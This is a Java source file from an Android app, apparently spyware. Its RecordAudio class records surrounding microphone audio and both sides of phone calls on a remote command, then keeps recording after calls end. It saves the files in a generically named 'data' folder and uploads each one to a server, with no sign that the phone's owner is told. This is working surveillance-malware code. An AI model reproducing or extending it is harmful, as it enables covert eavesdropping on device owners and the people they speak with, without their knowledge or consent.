package com.inet.android.audio;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.media.MediaRecorder;
import android.os.Environment;
import android.preference.PreferenceManager;

import com.inet.android.request.AppConstants;
import com.inet.android.request.RequestList;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.loopj.android.http.RequestParams;

/**
 * RecordAudio class is designed to record audio after command.
 * 
 * @author johny homicide
 * 
 */
public final class RecordAudio {

	private static MediaRecorder mMediaRecorder;
	private static String time;
	private static final String mPathName = "data";

	// Thread pool
	private static ExecutorService mThreadPool = Executors.newCachedThreadPool();;
	public static AtomicBoolean mRecording = new AtomicBoolean(false);
	private static String outputFileName;
	private static String LOG_TAG = RecordAudio.class.getSimpleName()
			.toString();
//	private final static int SECONDS_PER_MINUTE = 60;
	// private static final int MINUTE_PER_HOUR = 60;
	private static int minute = -1;
	private static int duration = -1;
	private static Context mContext;
	private static SharedPreferences sp;
	
	private final static Object lock = new Object();
	
	private static int recState = 0; // 0 - no rec; 1 - env rec; 2 - call rec; 3 - call env rec
	
	// 1
	public static void startEnvRec(final int minute, final int source, final Context ctx) {
		Logging.doLog(LOG_TAG, "startEnvRec. recState = " + recState, 
				"startEnvRec. recState = " + recState);
		recState = 1;
		Logging.doLog(LOG_TAG, "1 recState = " + recState, 
				"1 recState = " + recState);
		
		start(minute, source, ctx);
		Logging.doLog(LOG_TAG, "EnvRec started", "EnvRec started");
	}
	
	// 2
	public static void startCallRec(final int minute, final int source, final Context ctx) {
		Logging.doLog(LOG_TAG, "startCallRec. recState = " + recState,
				"startCallRec. recState = " + recState);
		stop();
		Logging.doLog(LOG_TAG, "2 recState = " + recState, 
				"2 recState = " + recState);
		recState = 2;
		start(minute, source, ctx);
		Logging.doLog(LOG_TAG, "CallRec started", "CallRec started");
	}
	
	// 3
	private static void startCallEnvRec(final int minute, final int source, final Context ctx) {
		Logging.doLog(LOG_TAG, "startCallEnvRec. recState = " + recState,
				"startCallEnvRec. recState = " + recState);
		recState = 3;
		Logging.doLog(LOG_TAG, "3 recState = " + recState, "3 recState = " + recState);
		start(minute, source, ctx);
		Logging.doLog(LOG_TAG, "CallEnvRec started", "CallEnvRec started");
	}
	
	private static void stopEnvRec() {
		Logging.doLog(LOG_TAG, "stopEnvRec", "stopEnvRec");
		
		sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		Editor ed = sp.edit();
		Logging.doLog(LOG_TAG, "duration = " + duration + ", minute = " + minute, 
				"duration = " + duration + ", minute = " + minute);
		if ((minute - duration) > 0) {
			ed.putInt("duration", minute - duration);
		} else {
			ed.putInt("duration", 0);
		}
		
		ed.putInt("souce_record", 0);
		ed.commit();
		
//		executeStopRecording();
		execStopRec();
		Logging.doLog(LOG_TAG, "after executeStopRecording", "after executeStopRecording");
	}
	
	private static void stopCallRec() {
		Logging.doLog(LOG_TAG, "stopCallRec", "stopCallRec");
//		executeStopRecording();
		execStopRec();
		Logging.doLog(LOG_TAG, "after executeStopRecording", "after executeStopRecording");
		
		int minuteAfterCall = AppSettings.getSetting(AppConstants.RECORD_ENVORIMENT, 
				mContext);
		minute = minuteAfterCall;
		Logging.doLog(LOG_TAG, "recording is true, minute after: " + minuteAfterCall,
				"recordAudio != null " + minuteAfterCall);

		if (minuteAfterCall == 0) {
			Logging.doLog(LOG_TAG, "minuteAfterCall == 0",
					"minuteAfterCall == 0");
			sp = PreferenceManager
					.getDefaultSharedPreferences(mContext);
			minute = sp.getInt("duration", 0);
			Logging.doLog(LOG_TAG, "duration = " + minute, "duration = " + minute);
			startEnvRec(minute, MediaRecorder.AudioSource.MIC, mContext);
		} else {
			startCallEnvRec(minuteAfterCall, MediaRecorder.AudioSource.MIC, mContext);
		}
	}
	
	private static void stopCallEnvRec() {
		Logging.doLog(LOG_TAG, "stopCallEnvRec", "stopCallEnvRec");
		execStopRec();
		sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);
		minute = sp.getInt("duration", 0);
		Logging.doLog(LOG_TAG, "duration = " + minute, "duration = " + minute);
		startEnvRec(minute, MediaRecorder.AudioSource.MIC, mContext);
	}
	
	public static void start(final int minute, final int source, final Context ctx) {
		Logging.doLog(LOG_TAG, "start", "start");
		
//		synchronized (lock) {
			mContext = ctx;
//			executeRecording(minute, source, ctx);
			execRec(minute, source, ctx);
//		}
	}
	
	public static void stop() {
		Logging.doLog(LOG_TAG, "stop. recState = " + recState, 
				"stop. recState = " + recState);
//		synchronized (lock) {
			switch (recState) {
			case 0:
				Logging.doLog(LOG_TAG, "case 0. recState = " + recState,
						"case 0. recState = " + recState);
				break;
			case 1:
				Logging.doLog(LOG_TAG, "case 1. recState = " + recState,
						"case 1. recState = " + recState);
				recState = 0;
				stopEnvRec();
				break;
			case 2:
				Logging.doLog(LOG_TAG, "case 2. recState = " + recState,
						"case 2. recState = " + recState);
				recState = 0;
				stopCallRec();
				break;
			case 3:
				Logging.doLog(LOG_TAG, "case 3. recState = " + recState,
						"case 3. recState = " + recState);
				recState = 0;
				stopCallEnvRec();
				break;
			default:
				Logging.doLog(LOG_TAG, "case default. recState = " + recState,
						"case default. recState = " + recState);
				recState = 0;
				break;
			}
//		}
		Logging.doLog(LOG_TAG, "after stop cases. recState = " + recState,
				"after stop cases. recState = " + recState);
	}
	
	/**
	 * Make audio recording without threadpool.
	 * @param minute total time of the record
	 * @param source source of recording
	 * @param ctx
	 */
	private static void execRec(final int minute, final int source,
			final Context ctx) {
		outputFileName = getOutputFileName();
		if (outputFileName != null) {
			Logging.doLog(LOG_TAG, "execRec", "execRec");
			if (getRecorder(minute, source, outputFileName) != null) {
				Logging.doLog(LOG_TAG, "execRec getRecord != null",
						"execRec getRecord != null");
			} else {
				Logging.doLog(LOG_TAG, "execRec getRecord == null", 
						"execRec getRecord == null");
				return;
			}
			
			// launch the counter
			Logging.doLog(LOG_TAG, "execRec mThreadPool.execute",
					"executeRecording mThreadPool.execute");
			Logging.doLog(LOG_TAG, "execRec minute = " + minute,
					"executeRecording minute = " + minute);
			mThreadPool.execute(new RecordingCounterUpdater());
		}
	}
	
	/**
	 * Make stopping audio recording without threadpool.
	 * @param minute
	 * @param source
	 * @param ctx
	 */
	private static void execStopRec() {
		if (mMediaRecorder != null) {
			Logging.doLog(LOG_TAG, "execStopRec",	"execStopRec");
			stopRecording();
			
			mThreadPool.execute(new Runnable() {
				@Override
				public void run() {
					if (outputFileName != null) sendAudio(outputFileName);
					outputFileName = null;
				}
			});
		}
	}
	
	

	/**
	 * 
	 * @param min
	 * @param source
	 * @param fileName
	 * @return
	 */
	private static MediaRecorder getRecorder(int min, int source,
			String fileName) {
//		if (min != -1) {
//			minute = min * SECONDS_PER_MINUTE;
			Logging.doLog(LOG_TAG, "getRecorder minute = " + min,
					"getRecorder minute = " + min);
//		}		

			if (min == -1) {
				minute = -1;
			}
//		if (mMediaRecorder == null) {
			Logging.doLog(LOG_TAG, "mMediaRecorder = " + mMediaRecorder, 
					"mMediaRecorder = " + mMediaRecorder);
			Logging.doLog(LOG_TAG, "source = " + source + ", minute = " + minute,
					"source = " + source + ", minute = " + minute);

			mMediaRecorder = new MediaRecorder();
			
			Logging.doLog(LOG_TAG, "mMediaRecorder = " + mMediaRecorder,
					"mMediaRecorder = " + mMediaRecorder);
			
			switch (source) {
			case 1:
				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
				break;
			case 2:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_UPLINK);
				break;
			case 3:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_DOWNLINK);
				break;
			case 4:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
				break;
			case 5:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
				break;
			case 6:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);
				break;
			default:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
				break;
			}

			mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
			mMediaRecorder.setOutputFile(fileName);
			mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
			mMediaRecorder.setAudioEncodingBitRate(16);
			mMediaRecorder.setAudioSamplingRate(44100);
			mMediaRecorder.setOnErrorListener(new RecorderErrorListener());


		try {
			mMediaRecorder.prepare();
			mMediaRecorder.start();
			
			Logging.doLog(LOG_TAG, "mMediaRecorder.start()", "mMediaRecorder.start()");
		} catch (IllegalStateException e) {
			Logging.doLog(LOG_TAG, "IllegalStateException thrown while trying to record a greeting",
					"IllegalStateException thrown while trying to record a greeting");
			e.printStackTrace();
			mMediaRecorder = null;
			stop();
		} catch (IOException e) {
			Logging.doLog(LOG_TAG, "IOException thrown while trying to record a greeting",
					"IOException thrown while trying to record a greeting");
			e.printStackTrace();
			mMediaRecorder = null;
			stop();
		} catch (RuntimeException e) {
			e.printStackTrace();
			if (source != 0) {
				Logging.doLog(LOG_TAG, "Runtimeexception. Switch to the source 0", 
						"Runtimeexception. Switch to the source 0");
				mMediaRecorder.reset();
				getRecorder(minute, MediaRecorder.AudioSource.DEFAULT, fileName);
			} else {
				Logging.doLog(LOG_TAG, "Runtimeexception. Source = 0. Return null.",
						"Runtimeexception. Source = 0. Return null.");
				return null;
			}
		}
		mRecording.set(true);
		Logging.doLog(LOG_TAG, "mRecording = " + mRecording.get(), 
				"mRecording = " + mRecording.get());
		return mMediaRecorder;
	}
	

	private static void stopRecording() {
		if (mMediaRecorder != null) {
			Logging.doLog(LOG_TAG, "Stopping recording", "Stopping recording");
			mMediaRecorder.stop();
		}
	}

	/**
	 * Creates and gets output file name
	 * 
	 * @return
	 */
	private static String getOutputFileName() {
		// create media file
		String dir = Environment.getExternalStorageDirectory()
				.getAbsolutePath() + File.separator + mPathName;
		File filePath = new File(dir);
		if (!filePath.exists()) {
			filePath.mkdirs();
		}
		time = ConvertDate.logTime();
		String file = dir + "/" + time + ".aac";
		
		Logging.doLog(LOG_TAG, "file " + file, "file " + file);
		
		File audioFile = new File(file);
		try {
			if (!audioFile.exists()) {
				audioFile.createNewFile();
			}
		} catch (IOException e) {
			Logging.doLog(LOG_TAG, "Unable to create media file!",
					"Unable to create media file!");
			e.printStackTrace();
		}

		return audioFile.getAbsolutePath();
	}

	/**
	 * Updates duration counter while recording a message.
	 */
	private static class RecordingCounterUpdater implements Runnable {

		@Override
		public void run() {
			int currentCounter = 0;
			synchronized (lock) {
				Logging.doLog(LOG_TAG, "1 counterUpdater recState = " + recState + " minute = " + minute, 
						"1 counterUpdater recState = " + recState + " minute = " + minute);
				while (recState != 0) {
					if (minute != -1)
						postCounterUpdateMessage(currentCounter / 10);
					try {
						Thread.sleep(100);
					} catch (InterruptedException e) {
						// Re-assert the thread's interrupted status
						Thread.currentThread().interrupt();
						return;
					}
					currentCounter++;
					duration = currentCounter / 10;
					Logging.doLog(LOG_TAG, String.format(
							"posting counter update of:%d", currentCounter), String
							.format("posting counter update of:%d", currentCounter));
				}
				Logging.doLog(LOG_TAG, "2 counterUpdater recState = " + recState,
						"2 counterUpdater recState = " + recState);
			}
		}
	}

	/**
	 * Posts current position in the voice file to the Handler.
	 */
	private static void postCounterUpdateMessage(int currentPosition) {

		if (currentPosition == (minute * 60)) {
			Logging.doLog(LOG_TAG, "equals = " + minute, "equals = " + minute);
			stop();
//			executeStopRecording();
		}
	}

	private static void sendAudio(String path) {
		Logging.doLog(LOG_TAG, "sendAudio duration " + duration, "sendAudio "
				+ duration);
		if (!AppSettings.getLastCreateAudioFile().equals(path)) {
			RequestParams params = new RequestParams();
			try {
				params.put("data[][time]", ConvertDate.logTime());
				params.put("data[][type]", AppConstants.TYPE_AUDIO_REQUEST);
				params.put("data[][duration]", duration);
				params.put("data[][path]", path);
				params.put("key", System.currentTimeMillis());
				params.put("data[][file]", new File(path));
			} catch (FileNotFoundException e) {
				Logging.doLog(LOG_TAG, "FileNotFoundException", 
						"FileNotFoundException");
				e.printStackTrace();
			}
			RequestList.sendFileRequest(params, mContext);
		}
	}

	/**
	 * Listener for the MediaRecorder error messages.
	 */
	private static class RecorderErrorListener implements
			android.media.MediaRecorder.OnErrorListener {

		@Override
		public void onError(MediaRecorder mp, int what, int extra) {

			String whatDescription = "";

			switch (what) {
			case MediaRecorder.MEDIA_RECORDER_ERROR_UNKNOWN:
				whatDescription = "MEDIA_RECORDER_ERROR_UNKNOWN";
				break;
			default:
				whatDescription = Integer.toString(what);
				break;
			}
			Logging.doLog(LOG_TAG, String.format(
					"MediaRecorder error occured: %s,%d", whatDescription,
					extra), String.format("MediaRecorder error occured: %s,%d",
					whatDescription, extra));
		}
	}

}